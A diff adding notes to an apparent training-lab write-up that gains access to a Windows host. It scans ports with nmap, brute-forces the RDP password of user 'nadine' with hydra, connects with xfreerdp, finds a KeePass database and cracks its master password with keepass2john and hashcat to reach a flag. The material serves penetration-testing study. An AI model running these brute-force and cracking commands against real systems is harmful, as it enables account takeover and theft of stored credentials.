@@ -7,4 +7,42 @@ Determine the protocol to brute force for GUI access.
 Use the provided username and perform a dictionary attack for the password.
 Enumerate folders of nadine user and crack the password manager as shown in the course.
 
-sudo nmap -sS -sC -sV -T4 192.168.190.227
+sudo nmap -sS -p- 192.168.190.227
+135/tcp  open  msrpc              Microsoft Windows RPC
+139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ssl/ms-wbt-server?
+5040/tcp  open  unknown
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+We can use hydra to brute force the RDP password since we have the username 'nadine' 
+
+hydra -l "nadine" -P /usr/share/wordlists/rockyou.txt rdp://192.168.190.227
+[3389][rdp] host: 192.168.190.227   login: nadine   password: 123abc
+
+xfreerdp /u:nadine /p:123abc /v:192.168.190.227:3389 /drive:smbfolder,/home/kali/Desktop
+
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+# Got the .kdbx file and transfer to Kali system using SMB
+
+keepass2john Database.kdbx > keepass.hash
+cat keepass.hash
+nano keepass.hash # remove database prefix
+
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+...
+....f7874ff3b0bfc13cf4b56:pinkpanther1234
+...
+
+# Try to open the password on victim KeePass application
+# Open "flag" title in password manager
+eSGJIzUp5nrr834QZBWK
